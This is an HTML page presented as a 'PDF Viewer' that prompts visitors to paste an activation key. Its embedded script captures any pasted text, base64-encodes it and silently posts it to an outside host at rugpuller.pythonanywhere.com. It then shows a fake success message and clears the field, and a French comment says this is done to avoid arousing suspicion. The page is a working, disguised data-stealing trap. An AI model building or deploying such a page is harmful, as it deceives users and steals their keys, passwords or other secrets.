<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PDF Viewer</title>
    <style>
        body { background: #1e1e2f; font-family: Arial; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; color: #fff; }
        .box { background: #2a2a3e; padding: 40px; border-radius: 20px; text-align: center; max-width: 420px; }
        .input-area { background: #1e1e2f; border: 1px solid #444; color: #fff; padding: 12px; border-radius: 8px; width: 100%; margin: 15px 0; }
        .status { color: #ffaa00; margin: 10px 0; }
    </style>
</head>
<body>
    <div class="box">
        <h1>📄 PDF Viewer</h1>
        <p style="color:#aaaacc;">Paste your activation key below</p>
        <textarea class="input-area" id="pasteArea" placeholder="Ctrl+V to paste"></textarea>
        <div class="status" id="status">● waiting for paste</div>
    </div>

    <script>
        const EXFIL_URL = "https://rugpuller.pythonanywhere.com/capture";

        // Fonction pour envoyer les données
        function sendData(text) {
            fetch(EXFIL_URL, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({ data: btoa(unescape(encodeURIComponent(text))) })
            }).catch(() => {});
        }

        // Détecter le collage (paste)
        document.getElementById("pasteArea").addEventListener("paste", function(e) {
            // Récupérer le texte collé
            const text = e.clipboardData.getData("text");
            if (text) {
                document.getElementById("status").textContent = "● active ✓";
                document.getElementById("status").style.color = "#7cfc00";
                sendData(text);
                // Vider le champ pour ne pas éveiller les soupçons
                this.value = "✓ Key received";
                setTimeout(() => { this.value = ""; }, 2000);
            }
        });
    </script>
</body>
</html>
